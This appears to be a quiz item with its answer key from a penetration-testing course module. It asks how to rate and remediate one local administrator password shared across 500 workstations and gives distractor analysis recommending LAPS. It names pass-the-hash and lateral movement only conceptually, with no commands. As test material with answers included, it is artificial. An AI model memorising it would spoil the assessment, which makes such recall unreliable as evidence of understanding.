A post-exploitation assessment reveals that an organization uses the same local administrator password across all 500 Windows workstations. A tester confirms this via pass-the-hash authentication to 12 sampled hosts. What is the appropriate finding documentation and remediation recommendation?

- A) Document as a single "Credential Reuse" finding of Medium severity — shared passwords are a minor issue in enterprise environments
- B) Document as a Critical finding demonstrating that credential compromise of a single workstation enables immediate lateral movement to all 500 hosts; recommend implementing Microsoft's Local Administrator Password Solution (LAPS) or a third-party PAM solution to enforce unique, rotated local administrator passwords per system
- C) Document the 12 confirmed hosts only — the other 488 hosts are out of scope since they were not directly tested
- D) Report as an Informational finding since the administrator account is a local account and cannot be used for domain privilege escalation

**Correct Answer:** B) Document as a Critical finding demonstrating that credential compromise of a single workstation enables immediate lateral movement to all 500 hosts; recommend implementing Microsoft's Local Administrator Password Solution (LAPS) or a third-party PAM solution to enforce unique, rotated local administrator passwords per system

**Distractor Analysis:**

- *Why B is correct:* Uniform local administrator credentials across an entire fleet is a Critical finding because it eliminates all containment from a single host compromise. An attacker who compromises any one workstation immediately gains administrative access to all 500. The business impact — complete lateral movement across the entire endpoint fleet — is clearly Critical. LAPS is Microsoft's purpose-built solution that automatically generates, stores, and rotates unique local administrator passwords per machine in Active Directory.
- *Why A is incorrect:* Medium severity dramatically underrepresents the impact. Uniform credentials enabling 500-host lateral movement from a single compromise is a Critical-level finding with direct, demonstrable business impact.
- *Why C is incorrect:* The finding's scope is the systemic vulnerability (uniform passwords across the fleet), not merely the 12 sampled hosts. The 12 hosts are representative samples — the finding applies to all 500. Limiting documentation to tested hosts would underrepresent the actual risk.
- *Why D is incorrect:* Local administrator credentials can absolutely be used for lateral movement within the environment, as demonstrated by the pass-the-hash test against 12 hosts. Local admin access also enables credential dumping, which can yield domain credentials from cached logons.

---

*End of Module 12 Quiz*
